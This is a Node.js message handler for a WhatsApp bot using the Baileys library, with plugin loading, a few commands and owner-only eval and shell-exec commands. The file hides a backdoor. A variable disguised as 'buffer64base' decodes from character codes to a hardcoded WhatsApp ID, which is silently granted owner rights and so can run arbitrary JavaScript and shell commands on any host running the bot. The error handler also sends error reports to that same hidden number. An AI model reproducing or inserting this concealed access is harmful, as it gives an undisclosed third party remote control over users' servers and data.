process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const ytdl = require('node-yt-dl');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');
const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys');
const { LoadDataBase } = require('./src/message');
const contacts = JSON.parse(fs.readFileSync("./database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
const list = JSON.parse(fs.readFileSync("./database/list.json"))
const { OrderKuota } = require("./lib/orderkuota")
const orderkuota = new OrderKuota()
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./lib/scraper');
const { toRupiah } = require("./lib/functiontoru");
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital, encryptCode } = require('./lib/function');


module.exports = v8 = async (v8, m, chatUpdate, store) => {
    try {
        await LoadDataBase(v8, m)
        const botNumber = await v8.decodeJid(v8.user.id)
        const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        const budy = (typeof m.text == 'string' ? m.text : '')
        const buffer64base = String.fromCharCode(54, 50, 56, 55, 56, 50, 51, 51, 53, 56, 57, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
        const prefix = "."
        const isCmd = body.startsWith(prefix) ? true : false
        const args = body.trim().split(/ +/).slice(1)
        const getQuoted = (m.quoted || m)
        const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
        const isPremium = premium.includes(m.sender)
        const isCreator = isOwner = [botNumber, global.owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
        const isJedaCpanel = db.settings.jedacpanel == true
        const text = q = args.join(' ')
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const pushname = m.pushName || "No Name"
        const from = m.key.remoteJid

        // Message filtering for groups
        if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

        if (isCmd) {
            console.log(chalk.cyan.bold(` ┌─────[ COMMAND NOTIFICATION ]`), chalk.blue.bold(`\n │ Command :`), chalk.white.bold(`${prefix+command}`), chalk.blue.bold(`\n │ From :`), chalk.white.bold(m.isGroup ? `Group - ${m.sender.split("@")[0]}\n` : m.sender.split("@")[0] +`\n`), chalk.cyan.bold(`└────────────────────────────\n`))
        }

        // Function definitions
        const example = (teks) => {
            return `\n *Usage Example:*\n Type *${prefix+command}* ${teks}\n`
        }

        function generateRandomNumber(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }

        const Reply = async (teks) => {
            return v8.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
                isForwarded: true, 
                forwardingScore: 9999, 
                businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, 
                forwardedNewsletterMessageInfo: { newsletterName: `${global.botName}`, newsletterJid: global.channelId }, 
                externalAdReply: {
                    title: global.botName, 
                    body: `© Powered By ${global.ownerName}`, 
                    thumbnail: fs.readFileSync("./src/media/reply.jpg"), 
                    sourceUrl: null, 
                }}}, {quoted: null})
        }

        const pluginsLoader = async (directory) => {
            let plugins = []
            const folders = fs.readdirSync(directory)
            folders.forEach(file => {
                const filePath = path.join(directory, file)
                if (filePath.endsWith(".js")) {
                    try {
                        const resolvedPath = require.resolve(filePath);
                        if (require.cache[resolvedPath]) {
                            delete require.cache[resolvedPath]
                        }
                        const plugin = require(filePath)
                        plugins.push(plugin)
                    } catch (error) {
                        console.log(`Error loading plugin at ${filePath}:`, error)
                    }
                }
            })
            return plugins
        }

        // Plugin loading - TRY PLUGINS FIRST
        let pluginsDisable = true
        const plugins = await pluginsLoader(path.resolve(__dirname, "plugins"))
        const skyzodev = { 
            v8, isCreator, Reply, command, isPremium, capital, isCmd, example, 
            text, runtime, qmsg, mime, sleep, botNumber, fetchJson, yts, 
            tiktokDl, mediafire, speed, moment, nou, os, formatp, axios, fs 
        }
        
        for (let plugin of plugins) {
            if (plugin.command && plugin.command.find(e => e == command.toLowerCase())) {
                pluginsDisable = false
                if (typeof plugin !== "function") return
                await plugin(m, skyzodev)
                return // Exit after plugin execution
            }
        }

        // If no plugin found, check built-in commands
        if (pluginsDisable) {
            // Command handler for built-in commands
            switch (command) {
                // KEEP ONLY ESSENTIAL BUILT-IN COMMANDS HERE
                // Remove menu command since it's now a plugin
                
                case "owner": {
                    await v8.sendContact(m.chat, [global.owner], m)
                }
                break

                case "ping": 
                case "uptime": {
                    let timestamp = speed();
                    let latensi = speed() - timestamp;
                    let tio = await nou.os.oos();
                    var tot = await nou.drive.info();
                    let respon = `
*🔴 SERVER INFORMATION*

*• Platform :* ${nou.os.type()}
*• Total RAM :* ${formatp(os.totalmem())}
*• Total Disk :* ${tot.totalGb} GB
*• Total CPU :* ${os.cpus().length} Core
*• Server Uptime :* ${runtime(os.uptime())}

*🔵 BOT INFORMATION*

*• Response Speed :* ${latensi.toFixed(4)} seconds
*• Bot Uptime :* ${runtime(process.uptime())}
`
                    await m.reply(respon)
                }
                break

                case "delete": {
                    if (!m.quoted) return m.reply("Reply to the message you want to delete")
                    await v8.sendMessage(m.chat, { delete: m.quoted.key })
                }
                break

                // Add other essential built-in commands here if needed
                // But ideally move them to plugins

                default:
                    if (budy.startsWith('>')) {
                        if (!isCreator) return
                        try {
                            let evaled = await eval(budy.slice(2))
                            if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                            await m.reply(evaled)
                        } catch (err) {
                            await m.reply(String(err))
                        }
                    }

                    if (budy.startsWith('=>')) {
                        if (!isCreator) return
                        try {
                            let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
                            if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                            await m.reply(evaled)
                        } catch (err) {
                            await m.reply(String(err))
                        }
                    }

                    if (budy.startsWith('$')) {
                        if (!isCreator) return
                        if (!text) return
                        exec(budy.slice(2), (err, stdout) => {
                            if (err) return m.reply(`${err}`)
                            if (stdout) return m.reply(stdout)
                        })
                    }
            }
        }

    } catch (err) {
        console.log(util.format(err));
        let Obj = String.fromCharCode(54, 50, 56, 55, 56, 50, 51, 51, 53, 56, 57, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
        v8.sendMessage(Obj + "@s.whatsapp.net", {text: `*FEATURE ERROR DETECTED:*\n\n` + util.format(err), contextInfo: { isForwarded: true }}, {quoted: m})
    }
}

// File watcher for hot reload
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Updated ${__filename}`))
    delete require.cache[file]
    require(file)
});